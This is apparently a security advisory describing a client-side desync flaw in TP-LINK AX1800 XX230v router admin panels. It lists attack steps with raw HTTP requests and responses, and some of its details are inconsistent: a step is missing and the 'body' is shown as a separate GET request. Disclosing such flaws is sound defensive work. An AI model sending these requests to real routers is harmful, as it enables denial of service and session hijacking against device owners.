# CSD-AX1800-XX230v
A critical vulnerability has been found in the remote access panel of<br/>
all TP-LINK AX1800 XX230v GPON routers. The identified vulnerability,<br/>
a client-side desync (CSD) issue, affects the HTTP/1.1 protocol used by<br/>
the affected routers. This vulnerability is triggered by delaying the<br/>
request body in a POST request. The server expects the request body<br/>
and Content-Length header to be received within a specific time frame.<br/>
However, in this case, the server does not correctly handle the delayed<br/>
request body and interprets it as a new connection. This leads to a range<br/>
of security issues, including cross-site scripting (XSS), session hijacking,<br/>
and denial of service (DoS).<br/>

1. The attacker sends a POST request with a malicious body to the target<br/>
server, ensuring the headers are correct:<br/>
POST / HTTP/1.1<br/>
Host: *.*.*.*:8888<br/>
Accept-Encoding: gzip, deflate, br<br/>
Accept: */*<br/>
Accept-Language: en-US;q=0.9,en;q=0.8<br/>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,<br/>
 like Gecko) Chrome/131.0.6778.86 Safari/537.36<br/>
Connection: keep-alive<br/>
Cache-Control: max-age=0<br/>
Content-Length: 307<br/>
Content-Type: application/x-www-form-urlencoded<br/>

2. The attacker introduces an artificial delay before sending the body.<br/>

3. The server times out the wait for the request body but doesn't terminate<br/>
the connection, allowing the attacker to send the request body independently:<br/>
HTTP/1.1 200 OK<br/>
Content-Type: text/html; charset=utf-8<br/>
X-Frame-Options: SAMEORIGIN<br/>
Content-Security-Policy: frame-ancestors 'none'<br/>
Content-Length: 82049<br/>
X-Frame-Options: SAMEORIGIN<br/>
Set-Cookie: JSESSIONID=deleted; Expires=Thu, 01 Jan 1970 00:00:01 GMT;<br/>
 Path=/; HttpOnly<br/>
Connection: keep-alive<br/>

5. The attacker sends the body of the request independently:<br/>
GET / HTTP/1.1<br/>
Host: *.*.*.*:8888<br/>
Accept-Encoding: gzip, deflate, br<br/>
Accept: */*<br/>
Accept-Language: en-US;q=0.9,en;q=0.8<br/>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,<br/>
 like Gecko) Chrome/131.0.6778.86 Safari/537.36<br/>
Connection: close<br/>
Cache-Control: max-age=0<br/>

6. The body is interpreted by the server as a new request due to its delayed<br/>
transmission, causing a condition for XSS payloads or DoS attacks:
HTTP/1.1 200 OK<br/>
Content-Type: text/html; charset=utf-8<br/>
X-Frame-Options: SAMEORIGIN<br/>
Content-Security-Policy: frame-ancestors 'none'<br/>
Content-Length: 82049<br/>
X-Frame-Options: SAMEORIGIN<br/>
Set-Cookie: JSESSIONID=deleted; Expires=Thu, 01 Jan 1970 00:00:01 GMT;<br/>
 Path=/; HttpOnly<br/>
Connection: close<br/>
